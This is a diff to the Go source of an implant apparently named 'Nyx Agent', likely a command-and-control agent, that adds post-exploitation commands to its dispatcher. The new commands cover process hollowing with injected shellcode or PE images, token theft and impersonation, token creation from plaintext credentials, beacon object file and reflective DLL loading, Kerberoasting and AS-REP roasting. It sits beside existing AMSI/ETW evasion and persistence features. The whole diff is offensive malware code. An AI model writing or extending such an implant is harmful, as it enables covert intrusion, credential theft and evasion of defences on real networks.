@@ -552,6 +552,152 @@ func dispatch(command string) (string, string) {
 			return "usage: evasion [status|amsi|etw|ppid <cmd>]", "failed"
 		}
 
+	// ── Phase 3: Advanced Post-Exploitation ────────────────────────────────
+
+	case "hollow":
+		// usage: hollow <target_exe> <shellcode_base64>
+		p := strings.SplitN(arg, " ", 2)
+		if len(p) < 2 {
+			return "usage: hollow <target_exe> <shellcode_base64>", "failed"
+		}
+		sc, err := base64.StdEncoding.DecodeString(p[1])
+		if err != nil {
+			return "base64 decode: " + err.Error(), "failed"
+		}
+		out, err := hollowProcess(p[0], sc)
+		if err != nil {
+			return err.Error(), "failed"
+		}
+		return out, "completed"
+
+	case "hollow-pe":
+		// usage: hollow-pe <target_exe> <pe_base64>
+		p := strings.SplitN(arg, " ", 2)
+		if len(p) < 2 {
+			return "usage: hollow-pe <target_exe> <pe_base64>", "failed"
+		}
+		pe, err := base64.StdEncoding.DecodeString(p[1])
+		if err != nil {
+			return "base64 decode: " + err.Error(), "failed"
+		}
+		out, err := hollowPE(p[0], pe)
+		if err != nil {
+			return err.Error(), "failed"
+		}
+		return out, "completed"
+
+	case "token-list":
+		return listTokens(), "completed"
+
+	case "token-steal":
+		// usage: token-steal <pid>
+		if arg == "" {
+			return "usage: token-steal <pid>", "failed"
+		}
+		pid, err := strconv.ParseUint(strings.TrimSpace(arg), 10, 32)
+		if err != nil {
+			return "invalid PID: " + arg, "failed"
+		}
+		out, err := impersonateProcess(uint32(pid))
+		if err != nil {
+			return err.Error(), "failed"
+		}
+		return out, "completed"
+
+	case "token-make":
+		// usage: token-make <domain> <user> <pass>
+		p := strings.SplitN(arg, " ", 3)
+		if len(p) < 3 {
+			return "usage: token-make <domain> <user> <pass>", "failed"
+		}
+		out, err := makeToken(p[0], p[1], p[2])
+		if err != nil {
+			return err.Error(), "failed"
+		}
+		return out, "completed"
+
+	case "token-revert":
+		return revertToken(), "completed"
+
+	case "token-spawn":
+		// usage: token-spawn <cmd>
+		if arg == "" {
+			return "usage: token-spawn <cmd>", "failed"
+		}
+		out, err := spawnAsCurrentToken(arg)
+		if err != nil {
+			return err.Error(), "failed"
+		}
+		return out, "completed"
+
+	case "bof":
+		// usage: bof <coff_base64> [args_base64]
+		p := strings.SplitN(arg, " ", 2)
+		if len(p) < 1 || p[0] == "" {
+			return "usage: bof <coff_base64> [args_base64]", "failed"
+		}
+		coff, err := base64.StdEncoding.DecodeString(p[0])
+		if err != nil {
+			return "coff base64 decode: " + err.Error(), "failed"
+		}
+		var args []byte
+		if len(p) == 2 && p[1] != "" {
+			args, err = base64.StdEncoding.DecodeString(p[1])
+			if err != nil {
+				return "args base64 decode: " + err.Error(), "failed"
+			}
+		}
+		out, err := loadBOF(coff, args)
+		if err != nil {
+			return err.Error(), "failed"
+		}
+		return out, "completed"
+
+	case "refdll":
+		// usage: refdll <dll_base64>
+		if arg == "" {
+			return "usage: refdll <dll_base64>", "failed"
+		}
+		dll, err := base64.StdEncoding.DecodeString(arg)
+		if err != nil {
+			return "base64 decode: " + err.Error(), "failed"
+		}
+		out, err := reflectiveDLLLoad(dll)
+		if err != nil {
+			return err.Error(), "failed"
+		}
+		return out, "completed"
+
+	case "kerb-list":
+		out, err := kerbList()
+		if err != nil {
+			return err.Error(), "failed"
+		}
+		return out, "completed"
+
+	case "kerb-roast":
+		// usage: kerb-roast <SPN>  e.g. HTTP/sqlsvc.corp.local
+		if arg == "" {
+			return "usage: kerb-roast <SPN>", "failed"
+		}
+		out, err := kerbRoast(strings.TrimSpace(arg))
+		if err != nil {
+			return err.Error(), "failed"
+		}
+		return out, "completed"
+
+	case "asrep-roast":
+		// usage: asrep-roast <user> <domain> <dc_ip>
+		p := strings.SplitN(arg, " ", 3)
+		if len(p) < 3 {
+			return "usage: asrep-roast <user> <domain> <dc_ip>", "failed"
+		}
+		out, err := asRepRoast(p[0], p[1], p[2])
+		if err != nil {
+			return err.Error(), "failed"
+		}
+		return out, "completed"
+
 	case "kill":
 		fmt.Println("[!] Kill command received, exiting.")
 		os.Exit(0)
@@ -700,7 +846,7 @@ func removePersistence() string {
 }
 
 func main() {
-	fmt.Println("[*] Nyx Agent v0.6.0 starting...")
+	fmt.Println("[*] Nyx Agent v0.8.0 starting...")
 
 	// Kill date check
 	checkKillDate()
